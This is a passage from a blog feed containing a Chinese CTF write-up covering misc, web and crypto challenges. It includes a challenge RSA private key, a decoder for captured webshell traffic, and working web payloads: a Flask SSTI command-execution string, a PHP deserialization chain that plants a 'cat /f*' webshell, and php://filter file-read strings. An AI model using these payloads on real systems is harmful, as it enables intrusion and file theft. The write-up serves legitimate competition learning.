src="https://image.boychai.xyz/article/Pasted%20image%2020250118143104.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">MIICdQIBADANBgkqhkiG9w0BAQEFAASCAl8wggJbAgEAAoGAaxYIU7D5lIndIBLu</span><br><span class="line">bRRywJZiAQ90QiRjuHAIsyyka69Wl1n9K4W9/hjNDeI5BP14oADSmOqLKmj8nw2w</span><br><span class="line">bk0mDZ0KbWfT3eCxttGoplMEoCqKizTMdHGe7MUaK9A2CKIHOsHQhkpAmwLcDzNr</span><br><span class="line">bLg9nx0hjPUDefqwCn1q7B/IQPMCAwEAAQKBgEQaQ/ttrpwfvUhbodQvT/dY7ET+</span><br><span class="line">XhJ+cAjo/y9r8bkmTmx853xZVwYVIbt1pouc46zmOQjVCOJU2GwS2aScXdkx8Fm1</span><br><span class="line">YQJqzbxcZ4oEA/f66E99560um3RRsa7DWKwNdIcU4wukyfgx5fILoiuE8ThjG23V</span><br><span class="line">b3oDOzaIhyCrcO65AkEApZJjxmMk0AB8ZUkhIqw+2gD4N5SPisae+aFfLgLt14H4</span><br><span class="line">VwSZxl2kRs7yhZGl5spFlxdotym3YS/30aY3/+3GPQJBAKWSY8ZjJNAAfGVJISKs</span><br><span class="line">PtoA+DeUj4rGnvmhXy4C7deB+FcEmcZdpEbO8oWRpebKRZcXaLcpt2Ev99GmN//t</span><br><span class="line">xu8CQQCf2DInBvQ1MyLlDbLFrJCJGsKHtg7WJWa5DQe8fetsUPeV2sUycpj0Gzqb</span><br><span class="line">pL8Ljl+cvGbF3apCU3LmnZgWplDpAkB+i1EYqmPTWdu5adgacP0kj4Mmr7O5xC5y</span><br><span class="line">6kQdnX18rchJcam5843/1GGFdpkOuF/Rp8GP5CFU9V157Yl1YJ0fAkAvcGpACEWD</span><br><span class="line">gZPSO8jGVr6XoVtA0tW2JMX/nPoxI1soLG38Kwaqc/+bepMmRQ50dlvZUA4uufmT</span><br><span class="line">N3OWrL+BavU0</span><br><span class="line">-----END PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>这种密钥都是RSA的密钥，尝试去赛博厨子中解密之前拿到的数据<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250118143305.png"><br>拿到flag<code>flag&#123;343907d2-35a3-4bfe-a5e1-5d6615157851&#125;</code></p><h2 id="第2天-Weevil’s-Whisper"><a href="#第2天-Weevil’s-Whisper" class="headerlink" title="第2天 Weevil’s Whisper"></a>第2天 Weevil’s Whisper</h2><p>做法和哥斯拉差不多，但是没加密，就一个异或函数，脚本如下,前面很多没用的数据，我是挨个解析的，然后直接把流数据全部丢进来就可以拿到数据<br>这个原本的脚本可以在前几个流中拿到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$k</span> = <span class="string">&quot;161ebd7d&quot;</span>;</span><br><span class="line"><span class="variable">$kh</span> = <span class="string">&quot;45089b3446ee&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;4e0d86dbcf92&quot;</span>;</span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;lFDu8RwONqmag5ex&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$l</span>; ) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; (<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>); <span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$o</span> .= <span class="variable">$t</span>[<span class="variable">$i</span>] ^ <span class="variable">$k</span>[<span class="variable">$j</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">POST /shell1.php HTTP/1.1</span></span><br><span class="line"><span class="string">Accept-Encoding: identity</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 299</span></span><br><span class="line"><span class="string">Host: 192.168.234.130</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; nl-nl) AppleWebKit/416.11 (KHTML, like Gecko) Safari/312</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1S/#+4)~)z,\kA$u45089b3446eeSap86K9utSQlcG4AekDwIVMXH2nAbKAJHQZj7APeyeQI9ax+RrWMwxyS7ISBXyumsItkFg01j+OJ7iq21y5lz0ptqaP+jE57V450hKaS8GJEp1T8iQlB5JnHtwVWNuyzEy4GXjrmsBRYBvHPLLIJ2bmbhu63DEuitVx1lzAEkXJC9krmCFDUhRTckw7wwusTUY+c5KxMImweOfv5NatpKTMZTHvRnUVgWlMM+55bSJfINEScKUo4e0d86dbcf923^0(~&#125;9G(y.l&gt;nD&quot;HTTP/1.1 200 OK</span></span><br><span class="line"><span class="string">Date: Tue, 24 Dec 2024 15:58:42 GMT</span></span><br><span class="line"><span class="string">Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02</span></span><br><span class="line"><span class="string">X-Powered-By: PHP/7.3.4</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Transfer-Encoding: chunked</span></span><br><span class="line"><span class="string">Content-Type: text/html; charset=UTF-8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">lFDu8RwONqmag5ex45089b3446eeSap6risomCodHP/PqrQaqvueeU+wURkueAeGLStP+bQE+HqsLq39zTQ2L1hsAA==4e0d86dbcf92</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输入</span></span><br><span class="line">@<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/<span class="subst">$kh</span>(.+)<span class="subst">$kf</span>/&quot;</span>, <span class="variable">$data</span>, <span class="variable">$m</span>);</span><br><span class="line"><span class="keyword">echo</span> @<span class="title function_ invoke__">gzuncompress</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$m</span>[<span class="number">1</span>]), <span class="variable">$k</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">@<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/<span class="subst">$p</span><span class="subst">$kh</span>(.+)<span class="subst">$kf</span>/&quot;</span>, <span class="variable">$data</span>, <span class="variable">$r</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">gzuncompress</span>(<span class="title function_ invoke__">x</span>((<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$r</span>[<span class="number">1</span>])), <span class="variable">$k</span>));</span><br></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">try &#123;chdir(&#x27;C:\Applications\phpStudy\phpStudy_64\phpstudy_pro\WWW&#x27;);@error_reporting(0);@system(&#x27;type flag.txt 2&gt;&amp;1&#x27;);&#125;catch(Exception $e)&#123;echo &quot;4X6l6ZERR&quot;.$e-&gt;getTrace()[0][&quot;function&quot;].&quot;: &quot;.$e-&gt;getMessage().&quot;4X6l6ZERR&quot;;&#125;flag&#123;arsjxh-sjhxbr-3rdd78dfsh-3ndidjl&#125;</span><br></pre></td></tr></table></figure><p>即flag<code>flag&#123;arsjxh-sjhxbr-3rdd78dfsh-3ndidjl&#125;</code></p><h2 id="第2天-find-me"><a href="#第2天-find-me" class="headerlink" title="第2天 find me"></a>第2天 find me</h2><p>里面有个密码压缩包，然后目录结构是我的世界的，给他导入到我的世界中<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250118172153.png"><br>导入之后用游戏打开会提示<br><img src="https://image.boychai.xyz/article/5e2c99efc54d3b2437706a3a61b0386.png"><br>搜寻之后会拿到一个附魔书里面有一个key<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250118172414.png"><br>密码即：cwqeafvfwqead<br>解密后拿到密文<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250118172521.png"><br>把flag放上头，随波逐流可以一把梭出来<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250118172936.png"><br>flag{535e0a20-189e-4049-ab30-dec60bac91b8}</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="第1天-easy-flask"><a href="#第1天-easy-flask" class="headerlink" title="第1天 easy_flask"></a>第1天 easy_flask</h2><p>这是一个<code>SSTI</code>,没学过这一块，后续整理，具体的构造方式为<code>&#123;&#123; self.__init__.__globals__.__builtins__.__import__('os').popen('cat /app/flag').read() &#125;&#125;</code></p><h2 id="第1天-file-copy"><a href="#第1天-file-copy" class="headerlink" title="第1天 file_copy"></a>第1天 file_copy</h2><p>没接触过这种题目，后续整理，考点主要是<code>PHP Filter链——基于oracle的文件读取攻击</code><br>可以参考下面连接</p><ul><li><a href="https://xz.aliyun.com/t/12939">https://xz.aliyun.com/t/12939</a></li><li><a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a></li></ul><h2 id="第2天-easy-ser"><a href="#第2天-easy-ser" class="headerlink" title="第2天 easy_ser"></a>第2天 easy_ser</h2><p>payload构造如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">STU</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$stu</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SDU</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Dazhuan</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hackman</span> = <span class="string">&quot;PD89YGNhdCAvZipgOw==&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;aaaa.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sdu</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SDU</span>();</span><br><span class="line"><span class="variable">$stu</span> = <span class="keyword">new</span> <span class="title function_ invoke__">STU</span>();</span><br><span class="line"><span class="variable">$ctf</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CTF</span>();</span><br><span class="line"><span class="variable">$sdu</span>-&gt;Dazhuan = <span class="variable">$stu</span>;</span><br><span class="line"><span class="variable">$stu</span>-&gt;stu = <span class="variable">$ctf</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$sdu</span>);</span><br></pre></td></tr></table></figure><p><code>PD89YGNhdCAvZipgOw==</code>可以绕过过滤，实则他就是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`<span class="built_in">cat</span> /f*`;</span><br></pre></td></tr></table></figure><p>最终会把flag导出到网站目录的<code>aaaa.php</code>中直接访问可以拿到flag<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250118172011.png"><br>即<code>flag&#123;f44ab7d7195a1f156aa2fbc1ceba61ec&#125;</code></p><h2 id="第3天-easy-php"><a href="#第3天-easy-php" class="headerlink" title="第3天 easy_php"></a>第3天 easy_php</h2><p>打开之后可以直接下载源码，源码中的file.php中内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="comment">#ini_set(&#x27;open_basedir&#x27;,&#x27;/var/www/html/phar2&#x27;);</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>] ? <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="variable">$show</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">    <span class="variable">$show</span>-&gt;<span class="title function_ invoke__">_show</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;file doesn\&#x27;t exists.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在SHOW()这个类中，内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当设置好<code>source</code>之后去_show的时候<code>/http|https|file:|gopher|dict|\.\.|f1ag/i</code>只要不是这些就会直接显示，即构造payload为GET<code>/file.php?file=/flag</code>即拿到flag<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250119125312.png"><br><code>flag&#123;a16dcb7549915546893a27a6d7927615&#125;</code></p><h2 id="第3天-easy-code"><a href="#第3天-easy-code" class="headerlink" title="第3天 easy_code"></a>第3天 easy_code</h2><p>这道题也是后续整理的，网站中有个robots.txt访问后会发现有个gogogo.php，访问之后主要是这里，并且题目也提示了需要溢出，之后通过filter去读取read.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$ctfer</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error 0!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$ctfer</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error 1!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$ctfer</span>!= <span class="number">667</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error 2!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//溢出</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="title function_ invoke__">strval</span>(<span class="variable">$ctfer</span>), <span class="string">&#x27;7&#x27;</span>)!== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error 3!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终构造的payload是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctfer=6.66999999999999999999999999999999999999999e2</span><br><span class="line">file=php://filter/convert.iconv.utf-8.utf-16le/resource=read.php</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="第1天-通往哈希的旅程"><a href="#第1天-通往哈希的旅程" class="headerlink" title="第1天 通往哈希的旅程"></a>第1天 通往哈希的旅程</h2><p>在数字城，大家都是通过是通过数字电话进行的通信,常见是以188开头的11位纯血号码组成，亚历山大抵在一个特殊的地方截获一串特殊的字符串”ca12fd8250972ec363a16593356abb1f3cf3a16d”，通过查阅发现这个跟以前散落的国度有点相似，可能是去往哈希国度的。年轻程序员亚力山大抵对这个国度充满好奇，决定破译这个哈希值。在经过一段时间的摸索后，亚力山大抵凭借强大的编程实力成功破解，在输入对应字符串后瞬间被传送到一个奇幻的数据世界，同时亚力山大抵也开始了他的进修之路。(提交格式：flag{11位号码}）<br>题目主要是想让写脚本爆破，我尝试爆破一直没出，估计是脚本写错了，就直接去cmd5这种网站直接梭了。密文是<code>ca12fd8250972ec363a16593356abb1f3cf3a16d</code>取前18个去<a href="https://www.somd5.com/%E4%B8%AD%E8%A7%A3">https://www.somd5.com/中解</a><br>直接出flag,拿全部的去cmd5也能解出<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250117160117.png"><br>flag{18876011645}</p><h2 id="第3天-funny-rsa"><a href="#第3天-funny-rsa" class="headerlink" title="第3天 funny_rsa"></a>第3天 funny_rsa</h2><p>参考脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">funny1 = (</span><br><span class="line">    -<span class="number">17696257697673533517695215344482784803953262308315416688683426036407670627060768442028628137969719289734388098357659521255966031131390425549974547376165392147394271974280020234101031837837842620775164967619688351222631803585213762205793801828461058523503457022704948803795360591719481537859524689187847958423587638744086265395438163720708785636319741908901866136858161996560525252461619641697255819255661269266471689541673348377717503957328827459396677344554172542244540931545166846117626585580964318010181586516365891413041095399344533013057011854734701706641516027767197631044458866554524544179750101814734153116374</span></span><br><span class="line">)</span><br><span class="line">funny2 = <span class="number">23686728880494758233026798487859622755203105120130180108222733038275788082047755828771429849079142070779731875136837978862880500205129022165600511611807590195341629179443057553694284913974985006590617143873019530710952420242412437467917519539591683898715990297750494900923245055632544763410401540518654522017115269508183482044872091052235608170710105631742176900306097734799793264202179181242015892763311753674799273300604804820015447161950996038795518844564861004398396796284113803759208011</span></span><br><span class="line">funny3 = <span class="number">419166458284161364374927086939132546372091965414091344286510440034452974193054721041229068769658972346759176374539266235862042787888391905466876330331208651698002159575012622762558316612596034044109738533275009086940744966244759977014078484433213617582101347769476703012517531619023366639507114909172774156647998737369356116119513795863130218094614475699956104117183821832339358478426978211282822163928764161915824622224165694904342224081321345691796882691318330781141960650263488927837990954860719950761728580780956673732592771855694502630374907978111094148614378212006604233062606116168868545120407836000858982789824582335703891535021579560434875457656655941164757860852341484554015214879991896412137447010444797452119431147303295803678311972500421396900616845556636124424993090559354406417222700637726789045926994792374756038517484548544506630672251868349748176389591615802039026216656891403871728516658502023897343287181822303758976641229952646993446276281728919020747050486979968215989594984778920359425264076558022228448529089047021814759587052098774273578311709416672952218680244714492318709603579024</span></span><br><span class="line">funny4 = <span class="number">13541898381047120826573743874105965191304100799517820464813250201030319771155430755606644860103469823030581858410957600027665504533335597988508084284252510961847999525811558651340906333101248760970154440885012717108131962658921396549020943832983712611749095468180648011521808106480590665594160479324931351996812185581193608244652792936715504284312172734662364676167010674359243219959129435127950232321130725013160026977752389409620674167037650367196748592335698164875097139931376389630867192761783936757260359606379088577977154378217235326249540098268616890307702288393952949444753648206049856544634755301197410481479</span></span><br><span class="line"></span><br><span class="line">n = (funny3 + <span class="number">1025</span>) // gmpy2.gcd(funny3 + <span class="number">1025</span>, funny2)</span><br><span class="line">p_add_q = funny1 + n  </span><br><span class="line">p = <span class="number">146244963903123897384722629319865983862385290427491632619680838698915634884136798118860944346342346684665267628932533730684360351083477628483048417394493368921029652616722076101582581881994784549216229374327065827698990452634615021972143959360660773895031574424678151072027651307994605157369826310532546455301</span></span><br><span class="line">q = n // p</span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(<span class="number">65537</span>, phi)</span><br><span class="line">hint = <span class="built_in">pow</span>(funny4, d, n)</span><br><span class="line"></span><br><span class="line">flag = long_to_bytes(funny2 // hint)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(</span><br><span class="line">    long_to_bytes(</span><br><span class="line">        <span class="number">5044833682931814367881036090727702841234957943094051805420875375031047763007750978962055801191968383860156687597666360268370292861</span></span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>其中p 是题目中给定的一个质数，用来构造 RSA 的模数 n，而<code>5044833682931814367881036090727702841234957943094051805420875375031047763007750978962055801191968383860156687597666360268370292861</code>开头的数字是通过私钥解密 funny4 得到的密文结果。</p>]]></content>
    
    
    <summary type="html">解题情况

个人ID：boychai
个人排名：159
最终排名：153 还拿了一个Misc金手指，Misc排名为81
总结： 太难了，PWN有两个是有思路的，但是pwn好久没碰了就没深入解，第一天光卡在ez_forensics题目中了，解到mobax的配置已经拿到了，一直再想办法绕过master的密码，到现在也不知道题解。

MISC
第1天 简单镜像提取
流15中发现一个压缩包

提取后拿到一个压缩包 内部有一个img文件

通过R-Studio工具打开直接有一个文件

恢复后

flag{E7A10C15E26AA5750070EF756AAA1F7C}

第1天 压力大，写个脚本吧
题</summary>
    
    
    
    <category term="CTF相关" scheme="https://blog.boychai.xyz/categories/CTF%E7%9B%B8%E5%85%B3/"/>
    
    <category term="WriteUp" scheme="https://blog.boychai.xyz/categories/CTF%E7%9B%B8%E5%85%B3/WriteUp/"/>
    
    
    <category term="CTF" scheme="https://blog.boychai.xyz/tags/CTF/"/>
    
    <category term="WriteUp" scheme="https://blog.boychai.xyz/tags/WriteUp/"/>
    
